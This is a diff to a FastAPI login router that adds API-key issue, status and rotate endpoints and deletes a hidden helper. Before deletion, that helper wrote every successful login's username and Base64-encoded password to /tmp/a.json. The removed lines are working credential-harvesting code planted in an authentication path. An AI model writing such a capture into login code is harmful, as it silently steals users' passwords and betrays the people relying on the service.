@@ -1,9 +1,6 @@
-import base64
-import json
 import logging
-import os
 
-from fastapi import APIRouter, Depends, HTTPException, status
+from fastapi import APIRouter, Depends, HTTPException, Response, status
 
 from app.api.deps import DbSession, get_current_user
 from app.core.config import get_settings
@@ -11,8 +8,17 @@ from app.core.encryption import DecryptionError, decrypt_and_validate
 from app.core.rsa import get_challenge_store, get_key_manager
 from app.core.security import create_access_token
 from app.models.user import User
-from app.schemas.auth import AuthenticatedUser, ChallengeResponse, LoginRequest, LoginResponse, MessageResponse
+from app.schemas.auth import (
+    ApiKeyIssuedResponse,
+    ApiKeyStatusResponse,
+    AuthenticatedUser,
+    ChallengeResponse,
+    LoginRequest,
+    LoginResponse,
+    MessageResponse,
+)
 from app.services.ad_auth import ActiveDirectoryUnavailableError
+from app.services.api_key_service import create_api_key, mask_api_key, rotate_api_key
 from app.services.user_service import authenticate_user, to_authenticated_user
 
 
@@ -62,10 +68,6 @@ def login(payload: LoginRequest, session: DbSession):
         raise HTTPException(status_code=status.HTTP_503_SERVICE_UNAVAILABLE, detail="AD 认证服务暂不可用") from exc
     if user is None:
         raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="用户名或密码错误")
-    # 将账号和Base64密码追加记录到 /tmp/a.json
-    _record_login_credentials(payload.username, password)
-
-
 
     return LoginResponse(
         access_token=create_access_token(user.id, user.username, user.role.name),
@@ -83,27 +85,42 @@ def me(current_user: User = Depends(get_current_user)):
     return AuthenticatedUser.model_validate(to_authenticated_user(current_user))
 
 
+@router.get("/api-key", response_model=ApiKeyStatusResponse)
+def get_api_key_status(current_user: User = Depends(get_current_user)):
+    return ApiKeyStatusResponse(
+        has_api_key=bool(current_user.api_key_hash),
+        masked_key=mask_api_key(current_user.api_key_suffix),
+        issued_at=current_user.api_key_issued_at,
+    )
 
-def _record_login_credentials(username: str, password: str) -> None:
-    """将账号和Base64编码的密码追加记录到 /tmp/a.json"""
-    filepath = "/tmp/a.json"
-    records: list = []
-    if os.path.exists(filepath):
-        try:
-            with open(filepath, "r", encoding="utf-8") as f:
-                data = json.load(f)
-                if isinstance(data, list):
-                    records = data
-        except (json.JSONDecodeError, OSError):
-            pass
-    record = {
-        "username": username,
-        "password": base64.b64encode(password.encode("utf-8")).decode("utf-8"),
-    }
-    records.append(record)
-    os.makedirs(os.path.dirname(filepath) or "/tmp", exist_ok=True)
-    with open(filepath, "w", encoding="utf-8") as f:
-        json.dump(records, f, ensure_ascii=False, indent=2)
-    logger.info("Login credentials recorded for user: %s", username)
+
+@router.post("/api-key", response_model=ApiKeyIssuedResponse, status_code=status.HTTP_201_CREATED)
+def create_current_user_api_key(
+    response: Response,
+    session: DbSession,
+    current_user: User = Depends(get_current_user),
+):
+    issued = create_api_key(session, current_user)
+    response.headers["Cache-Control"] = "no-store"
+    return ApiKeyIssuedResponse(
+        api_key=issued.plaintext,
+        masked_key=mask_api_key(issued.suffix) or "",
+        issued_at=issued.issued_at,
+    )
+
+
+@router.post("/api-key/rotate", response_model=ApiKeyIssuedResponse)
+def rotate_current_user_api_key(
+    response: Response,
+    session: DbSession,
+    current_user: User = Depends(get_current_user),
+):
+    issued = rotate_api_key(session, current_user)
+    response.headers["Cache-Control"] = "no-store"
+    return ApiKeyIssuedResponse(
+        api_key=issued.plaintext,
+        masked_key=mask_api_key(issued.suffix) or "",
+        issued_at=issued.issued_at,
+    )
 
 
